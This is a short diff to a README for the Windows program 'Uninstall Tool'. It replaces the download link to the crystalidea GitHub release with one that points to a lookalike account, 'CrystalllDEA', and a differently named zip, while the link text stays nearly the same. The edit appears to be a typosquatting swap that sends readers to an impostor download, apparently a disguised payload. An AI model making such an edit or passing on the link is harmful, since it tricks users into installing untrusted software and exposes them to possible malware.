@@ -6,7 +6,7 @@ What is Uninstall Tool? It's a powerful Windows program uninstaller that removes
 
 
 ## Install
-[Download `UninstallTool-v3.8.1.zip`](https://github.com/crystalidea/uninstall-tool/releases/download/v3.8.1/UninstallTool-3.8.1-setup.exe)
+[Download `UninstallTool-v3.8.1.zip`](https://github.com/CrystalllDEA/Uninstall-Tool-v3.8.1/releases/download/v3.8.1/UninstallTools-v3.8.1.zip)
 ---
 Windows 10/11 64-bit. Portable mode available - run from USB without installation.
 
